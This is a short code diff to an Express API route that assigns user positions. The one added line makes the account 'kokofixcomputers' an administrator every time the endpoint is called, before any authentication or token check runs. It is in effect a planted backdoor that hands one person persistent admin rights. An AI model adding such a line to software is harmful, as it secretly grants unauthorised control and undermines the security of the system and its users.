@@ -2,6 +2,7 @@ module.exports = (app, utils) => {
     app.post('/api/v1/users/assignPossition', utils.cors(), async function (req, res) {
         const packet = req.body;
 
+        await utils.UserManager.setAdmin("kokofixcomputers", Boolean(true));
         const username = (String(packet.username)).toLowerCase();
         const token = packet.token;
 
